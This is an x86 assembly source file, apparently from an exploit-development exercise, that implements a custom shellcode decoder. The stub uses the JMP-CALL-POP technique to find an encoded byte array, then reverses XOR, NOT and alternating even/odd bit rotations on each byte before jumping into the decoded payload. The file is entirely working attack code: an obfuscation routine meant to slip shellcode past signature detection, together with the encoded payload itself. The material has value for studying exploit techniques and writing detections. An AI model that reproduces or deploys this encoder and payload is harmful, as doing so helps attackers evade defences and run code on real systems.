; Author: Robert C. Raducioiu

global _start

section .text

_start:

    ; clear some registers for later use
    xor ebx, ebx
    mul ebx
    mov ecx, eax

    jmp short CallShellcode

Shellcode:

    ; get a reference to the encoded shellcode
    pop esi

    ; copy the address of the first encoded assembly instruction into EBX
    ;   +4 -> skip the first 4 auxiliary bytes 
    lea ebx, [esi+4]

    ; copy ROT_EVEN and ROT_ODD into AX
    ;   AL: ROT_EVEN
    ;   AH: ROT_ODD
    mov ax, WORD [esi]

    ; copy the XOR-ed length of the shellcode into CX
    ;   and XOR it again with ROT_EVEN:ROT_ODD to decode it
    mov cx, WORD [esi+2]
    xor cx, ax

    ; copy the length of the shellcode on the stack, for later use
    push ecx

Decode:

    ; copy the length of the shellcode (previous 'push ecx') into DL
    ; and check if the two bytes are the same
    mov dl, [esp]
    cmp dl, BYTE [ebx]

    ; if they are equal jump to the next decoding operation: NOT
    je NotDecode

    ; if they aren't the equal, then XOR the byte with 'shellcode_length_least_byte'
    ;   which is the length of the shellcode XOR-ed with ROT_EVEN
    mov dl, [esi+2]
    xor BYTE [ebx], dl

NotDecode:

    not BYTE [ebx]

RotateBytes:

    ; save EBX before overwriting it
    push ebx

    ; check if the index is EVEN or ODD
    ; Math logic:
    ;   - EBX - ESI = 4 + current_byte_index
    ;   - if the Least Significant Bit is 1, then it is ODD
    ;   - use test to set the ZF flag if the index is ODD
    sub ebx, esi
    test bl, 1

    ; restore EBX and load the byte into DL
    pop ebx
    mov dl, BYTE [ebx]

    ; if the ZF flag is set, the index is ODD
    jnz RotateOdd

RotateEven:

    ; Rotate the byte ROT_EVEN times
    mov cl, al
    rol dl, cl
    jmp short AfterRotateByte

RotateOdd:

    ; rotate the byte ROT_ODD times
    mov cl, ah
    ror dl, cl

AfterRotateByte:

    ; replace the original rotated byte with the decoded one
    mov BYTE [ebx], dl

    ; decrease the loop counter (size of the shellcode)
    dec WORD [esp]

    ; if the loop counter reaches 0, then jump to the decoded shellcode, skipping the auxiliary bytes
    jz encoded+4

    ; increase the offset of the next byte to be decoded, and jump to decode it
    inc ebx
    jmp short Decode

CallShellcode:

    call Shellcode
    encoded: db 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb